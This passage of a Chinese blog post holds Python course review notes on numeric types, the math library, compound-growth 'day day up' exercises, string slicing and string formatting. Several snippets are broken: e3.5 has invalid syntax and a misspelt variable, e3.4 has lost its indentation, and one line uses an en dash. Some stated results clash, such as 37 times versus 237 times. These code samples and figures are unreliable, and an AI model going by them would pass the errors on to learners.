class="string">&#x27;車&#x27;</span>, <span class="string">&#x27;馬&#x27;</span>, <span class="string">&#x27;相&#x27;</span>, <span class="string">&#x27;仕&#x27;</span>, <span class="string">&#x27;帅&#x27;</span>, <span class="string">&#x27;仕&#x27;</span>, <span class="string">&#x27;相&#x27;</span>, <span class="string">&#x27;馬&#x27;</span>, <span class="string">&#x27;車&#x27;</span>, <span class="string">&#x27;兵&#x27;</span>, <span class="string">&#x27;砲&#x27;</span>]]</span><br><span class="line">    font_color = [<span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;green&#x27;</span>]           <span class="comment"># 设置棋子填充色</span></span><br><span class="line">    draw_chessboard(pos_of_x, pos_of_y)     <span class="comment"># 绘制空棋盘函数</span></span><br><span class="line">    draw_camp()                             <span class="comment"># 绘制将帅营房函数</span></span><br><span class="line">    draw_marker_gun()                       <span class="comment"># 绘制炮位标记函数</span></span><br><span class="line">    draw_marker_soldier()                   <span class="comment"># 绘制兵卒位标记函数</span></span><br><span class="line">    draw_boundary(pos_of_x, pos_of_y)       <span class="comment"># 绘制楚河汉界函数</span></span><br><span class="line">    draw_piece_soldier(pos_of_x, pos_of_y)  <span class="comment"># 绘制棋子兵和卒函数</span></span><br><span class="line">    draw_piece_gun(pos_of_x, pos_of_y)      <span class="comment"># 绘制棋子炮函数</span></span><br><span class="line">    draw_piece_other(pos_of_x, pos_of_y)    <span class="comment"># 绘制其他棋子函数</span></span><br><span class="line">    t.hideturtle()                          <span class="comment"># 隐藏画笔</span></span><br><span class="line">    t.update()                              <span class="comment"># 更新缓存</span></span><br><span class="line">    t.done()                                <span class="comment"># 结束绘制</span></span><br></pre></td></tr></table></figure>

<h1 id="Python基本数据类型"><a href="#Python基本数据类型" class="headerlink" title="Python基本数据类型"></a><strong>Python基本数据类型</strong></h1><h2 id="数字类型"><a href="#数字类型" class="headerlink" title="数字类型"></a>数字类型</h2><p>程序元素：010&#x2F;10，存在多种可能：表示十进制整数值10，类似人名一样的字符串</p>
<p>数字类型对Python语言中数字的表示和使用进行了定义和规范</p>
<p>Python语言包括三种数字类型：<strong>整数类型、浮点数类型、复数类型</strong></p>
<h3 id="整数类型"><a href="#整数类型" class="headerlink" title="整数类型"></a>整数类型</h3><p>与数学中的整数概念一致，没有取值范围限制</p>
<p><strong>pow(x, y)函数：计算x的y次方</strong></p>
<p>打开IDLE。程序1：pow(2,10) , pow(2,15)；程序2：pow(2, 1000)；程序3：pow(2, pow(2,15))</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%208.png" alt="image.png"></p>
<h3 id="浮点数类型"><a href="#浮点数类型" class="headerlink" title="浮点数类型"></a>浮点数类型</h3><p><strong>带有小数点及小数的数字。</strong></p>
<p>Python语言中浮点数的数值范围存在限制，小数精度也存在限制。这种限制与在不同计算机系统有关。</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%209.png" alt="image.png"></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/9566282e-cb4d-4b37-9309-be227c8518f2.png" alt="image.png"></p>
<p><strong>（1）浮点数间运算存在不确定尾数，不是bug</strong></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2010.png" alt="image.png"></p>
<p><strong>（2）浮点数间运算存在不确定尾数，不是bug</strong></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2011.png" alt="image.png"></p>
<p><strong>（3）浮点数间运算存在不确定尾数</strong></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2012.png" alt="image.png"></p>
<h3 id="复数类型"><a href="#复数类型" class="headerlink" title="复数类型"></a>复数类型</h3><p>与数学中的复数概念一致, z &#x3D; a + bj， a是实数部分，b是虚数部分，a和b都是浮点类型，虚数部分用j或者J标识。示例：12.3+4j,   -5.6+7j</p>
<p>z &#x3D; 1.23e-4+5.6e+89j（实部和虚部是什么？）</p>
<p>对于复数z，可以用<strong>z.real获得实数部分，z.imag获得虚数部分</strong></p>
<p>a.conjugate() 输出共轭复数</p>
<p>z.real &#x3D; 0.000123    z.imag &#x3D; 5.6e+89</p>
<h2 id="数字类型的操作"><a href="#数字类型的操作" class="headerlink" title="数字类型的操作"></a>数字类型的操作</h2><h3 id="数值运算操作符"><a href="#数值运算操作符" class="headerlink" title="数值运算操作符"></a>数值运算操作符</h3><p>（1）操作符是完成运算的一种符号体系</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2013.png" alt="image.png"></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2014.png" alt="image.png"></p>
<p>（2）二元操作符有对应的增强赋值操作符</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2015.png" alt="image.png"></p>
<h3 id="数字类型的关系"><a href="#数字类型的关系" class="headerlink" title="数字类型的关系"></a>数字类型的关系</h3><p>（1）<strong>类型间可进行混合运算，生成结果为”最宽”类型</strong></p>
<p>三种类型存在一种逐渐”扩展”或”变宽”的关系：整数  -&gt;  浮点数  -&gt;  复数</p>
<p>例如：123 + 4.0 &#x3D; 127.0（整数+浮点数 &#x3D; 浮点数）</p>
<p>可以用type()函数进行类型判断</p>
<p>（2）<strong>内置的数值运算函数：Python解释器提供了一些内置函数，在这些内置函数之中，有6个函数与数值运算相关</strong></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2016.png" alt="image.png"></p>
<h3 id="数字类型的转换"><a href="#数字类型的转换" class="headerlink" title="数字类型的转换"></a>数字类型的转换</h3><p>（1）<strong>数值运算操作符可以隐式地转换输出结果的数字类型</strong></p>
<p>例如，两个整数采用运算符“&#x2F;”的除法将可能输出浮点数结果。此外，通过内置的数字类型转换函数可以显式地在数字类型之间进行转换</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2017.png" alt="image.png"></p>
<p>（2）<strong>三种类型可以相互转换</strong></p>
<p>函数：int(), float(), complex()</p>
<p>示例：int(4.5) &#x3D; 4 （直接去掉小数部分）、float(4) &#x3D; 4.0 （增加小数部分）、complex(4) &#x3D; 4 + 0J</p>
<p><strong>复数不能转化为浮点数、整数，会报错!</strong></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2018.png" alt="image.png"></p>
<h3 id="数字类型的判断"><a href="#数字类型的判断" class="headerlink" title="数字类型的判断"></a>数字类型的判断</h3><p>函数：type(x)，返回x的类型，适用于所有类型的判断</p>
<p>示例：</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2019.png" alt="image.png"></p>
<h2 id="math库的使用"><a href="#math库的使用" class="headerlink" title="math库的使用"></a>math库的使用</h2><h3 id="math库概述"><a href="#math库概述" class="headerlink" title="math库概述"></a>math库概述</h3><p>（1）math库是Python提供的内置数学类函数库</p>
<p>（2）math库不支持复数类型</p>
<p>（3）math库一共提供了4个数学常数和44个函数。<strong>44个函数共分为4类。</strong></p>
<p><strong>包括：16个数值表示函数、8个幂对数函数、16个三角对数函数和4个高等特殊函数</strong></p>
<p>首先使用保留字import引用该库</p>
<p>第一种：import math。对math库中函数采用math.<b>()形式使用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line">math.ceil(<span class="number">10.2</span>)</span><br><span class="line"><span class="comment">#11</span></span><br></pre></td></tr></table></figure>

<p>第二种，from math import &lt;函数名&gt;。对math库中函数可以直接采用&lt;函数名&gt;()形式使用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> floor</span><br><span class="line">floor(<span class="number">10.2</span>)</span><br><span class="line"><span class="comment">#10</span></span><br></pre></td></tr></table></figure>

<h3 id="math库解析"><a href="#math库解析" class="headerlink" title="math库解析"></a>math库解析</h3><p>（1）math库包括4个数学常数</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2020.png" alt="image.png"></p>
<p>（2）math库包括16个数值表示函数</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2021.png" alt="image.png"></p>
<p>（3）math库中包括8个幂对数函数</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2022.png" alt="image.png"></p>
<p>（4）math库包括六个“三角、双曲函数”</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2023.png" alt="image.png"></p>
<p>（5）math库包括4个高等特殊函数</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2024.png" alt="image.png"></p>
<h2 id="天天向上的力量"><a href="#天天向上的力量" class="headerlink" title="天天向上的力量"></a><strong>天天向上的力量</strong></h2><p>1.一年365天，以第1天的能力值为基数，记为1.0，当好好学习时能力值相比前一天提高1%，当没有学习时由于遗忘等原因能力值相比前一天下降1%。每天努力和每天放任，一年下来的能力值相差多少呢？</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#e3.1DayDayUp365.py</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line">dayup = math.<span class="built_in">pow</span>((<span class="number">1.0</span> + <span class="number">0.001</span>), <span class="number">365</span>)   <span class="comment"># 提高0.001</span></span><br><span class="line">daydown = math.<span class="built_in">pow</span>((<span class="number">1.0</span> - <span class="number">0.001</span>), <span class="number">365</span>) <span class="comment"># 放任0.001</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;向上: &#123;:.2f&#125;, 向下: &#123;:.2f&#125;.&quot;</span>.<span class="built_in">format</span>(dayup, daydown))</span><br></pre></td></tr></table></figure>

<p>运行结果如下，每天努力1%，一年下来将提高44%，好像不多？请继续分析。</p>
<p>2.一年365天，如果好好学习时能力值相比前一天提高5%，当放任时相比前一天下降5%。效果相差多少呢？</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#e3.2DayDayUp365.py</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line">dayup = math.<span class="built_in">pow</span>((<span class="number">1.0</span> + <span class="number">0.005</span>), <span class="number">365</span>)   <span class="comment"># 提高0.005</span></span><br><span class="line">daydown = math.<span class="built_in">pow</span>((<span class="number">1.0</span> - <span class="number">0.005</span>), <span class="number">365</span>) <span class="comment"># 放任0.005</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;向上: &#123;:.2f&#125;, 向下: &#123;:.2f&#125;.&quot;</span>.<span class="built_in">format</span>(dayup, daydown))</span><br></pre></td></tr></table></figure>

<p>运行结果如下，每天努力5%，一年下来将提高6倍！</p>
<p>3.一年365天，如果好好学习时能力值相比前一天提高1%，当放任时相比前一天下降1%。效果相差多少呢？</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#e3.3DayDayUp365.py</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line">dayfactor = <span class="number">0.01</span></span><br><span class="line">dayup = math.<span class="built_in">pow</span>((<span class="number">1.0</span> + dayfactor), <span class="number">365</span>)    <span class="comment"># 提高dayfactor</span></span><br><span class="line">daydown = math.<span class="built_in">pow</span>((<span class="number">1.0</span> - dayfactor), <span class="number">365</span>)  <span class="comment"># 放任dayfactor</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;向上: &#123;:.2f&#125;, 向下: &#123;:.2f&#125;.&quot;</span>.<span class="built_in">format</span>(dayup, daydown))</span><br></pre></td></tr></table></figure>

<p>运行结果如下，每天努力1%，一年下来将提高37倍。这个相当惊人吧！</p>
<p>4.一年365天，一周5个工作日，如果每个工作日都很努力，可以提高1%，仅在周末放任一下，能力值每天下降1%，效果如何呢？</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#e3.4DayDayUp365.py</span></span><br><span class="line">dayup, dayfactor = <span class="number">1.0</span>, <span class="number">0.01</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">365</span>):</span><br><span class="line"><span class="keyword">if</span> i % <span class="number">7</span> <span class="keyword">in</span> [<span class="number">6</span>, <span class="number">0</span>]:<span class="comment">#周六周日</span></span><br><span class="line">dayup = dayup * (<span class="number">1</span> - dayfactor)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">dayup = dayup * (<span class="number">1</span> + dayfactor)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;向上5天向下2天的力量: &#123;:.2f&#125;.&quot;</span>.<span class="built_in">format</span>(dayup))</span><br></pre></td></tr></table></figure>

<p>猜猜运行结果？每周努力5天，而不是每天，一年下来，水平仅是初始的4.63倍！与每天坚持所提高的237倍相去甚远</p>
<p>5.如果对实例代码3.4的结果感到意外，那自然会产生如下问题：每周工作5天，休息2天，休息日水平下降0.01，工作日要努力到什么程度一年后的水平才与每天努力1%所取得的效果一样呢？</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#e3.5DayDayUp365.py</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dayUP</span>(<span class="params">df</span>):</span><br><span class="line">dayup = <span class="number">0.01</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">365</span>):</span><br><span class="line"><span class="keyword">if</span> i % <span class="number">7</span> <span class="keyword">in</span> [<span class="number">6</span>, <span class="number">0</span>]:</span><br><span class="line">dayup = dayup * (<span class="number">1</span> -<span class="number">0.01</span> df)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">dayup = dayup * (<span class="number">1</span> + df)</span><br><span class="line"><span class="keyword">return</span> dayup</span><br><span class="line">dayfacotr = <span class="number">0.01</span></span><br><span class="line"><span class="keyword">while</span> (dayUP(dayfactor)&lt;<span class="number">37.78</span>):</span><br><span class="line">    dayfactor += <span class="number">0.001</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;每天的努力参数是: &#123;:.3f&#125;.&quot;</span>.<span class="built_in">format</span>(dayfactor))</span><br></pre></td></tr></table></figure>

<p>如果每周连续努力5天，休息2天，为了达到每天努力1%所达到的的水平，则就需要在工作日将提高的程度达到约2%，即要努力1倍才仅是为了休息2天。这就是天天向上的力量。</p>
<h2 id="字符串类型及其操作"><a href="#字符串类型及其操作" class="headerlink" title="字符串类型及其操作"></a>字符串类型及其操作</h2><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><p>（1）由0个或多个字符组成的有序字符序列</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2025.png" alt="image.png"></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2026.png" alt="image.png"></p>
<p>（2）不同表示方法的作用</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2027.png" alt="image.png"></p>
<h3 id="字符串类型的转换"><a href="#字符串类型的转换" class="headerlink" title="字符串类型的转换"></a>字符串类型的转换</h3><p>大多数数据类型都可以通过str()函数转换为字符串</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2028.png" alt="image.png"></p>
<h3 id="字符串的序号"><a href="#字符串的序号" class="headerlink" title="字符串的序号"></a>字符串的序号</h3><p>正向递增序号和反向递减序号</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2029.png" alt="image.png"></p>
<h3 id="字符串的使用"><a href="#字符串的使用" class="headerlink" title="字符串的使用"></a>字符串的使用</h3><p>使用[ ]获取字符串中一个或多个字符</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2030.png" alt="image.png"></p>
<p>*注意：字符串的“驻留”</p>
<p><strong>Python对于短小字符串会自动驻留，使其指向同一块内存</strong></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2031.png" alt="image.png"></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2032.png" alt="image.png"></p>
<h3 id="字符串切片高级用法"><a href="#字符串切片高级用法" class="headerlink" title="字符串切片高级用法"></a>字符串切片高级用法</h3><p>使用[M: N: K]根据步长对字符串切片</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2033.png" alt="image.png"></p>
<h3 id="字符串的特殊字符"><a href="#字符串的特殊字符" class="headerlink" title="字符串的特殊字符"></a>字符串的特殊字符</h3><p>转义符 \</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2034.png" alt="image.png"></p>
<p><strong>字符串切片相关事例内容</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#TempStr[-1]：取字符串最后一个字符</span></span><br><span class="line"><span class="comment">#TempStr[0:-1]:取开始到最后一个字符（不含）的部分。左闭右开!!!</span></span><br><span class="line">s=<span class="string">&quot;Hello World&quot;</span></span><br><span class="line"><span class="built_in">print</span>(s[<span class="number">4</span>])<span class="comment">#o</span></span><br><span class="line"><span class="built_in">print</span>(s[<span class="number">1</span>:])<span class="comment">#ello World</span></span><br><span class="line"><span class="built_in">print</span>(s[:-<span class="number">1</span>])<span class="comment">#Hello Worl</span></span><br><span class="line"><span class="built_in">print</span>(s[-<span class="number">6</span>])<span class="comment">#和s[5]相同输出空格</span></span><br><span class="line"><span class="built_in">print</span>(s[<span class="number">6</span>:<span class="number">10</span>])<span class="comment">#Worl</span></span><br><span class="line"><span class="built_in">print</span>(s[-<span class="number">5</span>:-<span class="number">2</span>])<span class="comment">#Wor</span></span><br><span class="line"><span class="built_in">print</span>(s[<span class="number">2</span>:<span class="number">5</span>:<span class="number">1</span>])<span class="comment">#llo,下标2到5，步长为1</span></span><br><span class="line"><span class="built_in">print</span>(s[<span class="number">2</span>:<span class="number">5</span>:<span class="number">2</span>])<span class="comment">#lo,下标2到5，步长为2</span></span><br><span class="line"><span class="built_in">print</span>(s[<span class="number">5</span>:<span class="number">2</span>:-<span class="number">1</span>])<span class="comment"># ol,下标5到2，步长为-1（其实就是反过来）</span></span><br><span class="line"><span class="built_in">print</span>(s[-<span class="number">5</span>:-<span class="number">1</span>:<span class="number">3</span>])<span class="comment">#Wl,下标-5到-1,可认为是6到9，步长为3</span></span><br><span class="line"><span class="built_in">print</span>(s[::-<span class="number">1</span>])<span class="comment">#dlroW olleH 开头和结尾都省略时，默认按步长（-1从后往前1步，-2为从后往前2步）</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;print(&#x27;Hello World&#x27;)&quot;</span>)只去掉一层引号</span><br></pre></td></tr></table></figure>

<h3 id="字符串操作符"><a href="#字符串操作符" class="headerlink" title="字符串操作符"></a>字符串操作符</h3><p>（1）操作符及使用</p>
<p>由0个或多个字符组成的有序字符序列。<strong>如果*后面是负数，会怎样。</strong></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2035.png" alt="image.png"></p>
<p>（2）获取星期字符串</p>
<p>输入：1-7的整数，表示星期几。输出：输入整数对应的星期字符串。例如：输入3，输出星期三</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#WeekNamePrintV1.py</span></span><br><span class="line">weekStr = <span class="string">&quot;星期一星期二星期三星期四星期五星期六星期日&quot;</span></span><br><span class="line">weekId = <span class="built_in">eval</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入星期数字(1-7)：&quot;</span>))</span><br><span class="line">pos = (weekId–<span class="number">1</span>) * <span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(weekStr[pos: pos+<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#WeekNamePrintV2.py</span></span><br><span class="line">weekStr = <span class="string">&quot;一二三四五六日&quot;</span></span><br><span class="line">weekId = <span class="built_in">eval</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入星期数字(1-7)：&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;星期&quot;</span> + weekStr[weekId-<span class="number">1</span>])</span><br></pre></td></tr></table></figure>

<h3 id="字符串处理函数"><a href="#字符串处理函数" class="headerlink" title="字符串处理函数"></a>字符串处理函数</h3><p>（1）一些以函数形式提供的字符串处理功能</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2036.png" alt="image.png"></p>
<p>（2）一些以函数形式提供的字符串处理功能</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2037.png" alt="image.png"></p>
<p><strong>（3）Unicode编码：</strong>Python字符串的编码方式</p>
<p>统一字符编码，即覆盖几乎所有字符的编码方式</p>
<p>从0到1114111 (0x10FFFF)空间，每个编码对应一个字符</p>
<p>Python字符串中每个字符都是Unicode编码字符</p>
<p>例子：</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2038.png" alt="image.png"></p>
<h3 id="字符串处理方法"><a href="#字符串处理方法" class="headerlink" title="字符串处理方法"></a>字符串处理方法</h3><p>（1）”方法”在编程中是一个专有名词</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2039.png" alt="image.png"></p>
<p><strong>（2）一些以方法形式提供的字符串处理功能</strong></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2040.png" alt="image.png"></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2041.png" alt="image.png"></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2042.png" alt="image.png"></p>
<p>观察例子：</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2043.png" alt="image.png"></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2044.png" alt="image.png"></p>
<h2 id="字符串类型的格式化"><a href="#字符串类型的格式化" class="headerlink" title="字符串类型的格式化"></a>字符串类型的格式化</h2><h3 id="1-字符串格式化"><a href="#1-字符串格式化" class="headerlink" title="1.字符串格式化"></a><strong>1.字符串格式化</strong></h3><p>Python中字符串格式化的三种方法：</p>
<p>（1）字符串%运算：<strong>format%values，早期使用较多</strong></p>
<p>类似于C语言中的printf函数：format为格式字符串，values为要设置格式的值。</p>
<p>例：print（“Hello, %s” % name）</p>
<p>（2）字符串format方法:最常用例：print（“Hello,”.format（name））</p>
<p>（3）f字符串：例：print（f”Hello, {name}”）</p>
<h3 id="format-方法的基本使用"><a href="#format-方法的基本使用" class="headerlink" title="format()方法的基本使用"></a>format()方法的基本使用</h3><p>字符串format()方法的基本使用格式是：&lt;模板字符串&gt;.format(&lt;逗号分隔的参数&gt;)</p>
<p>默认的参数序号：</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2045.png" alt="image.png"></p>
<p>改变默认的参数序号：</p>
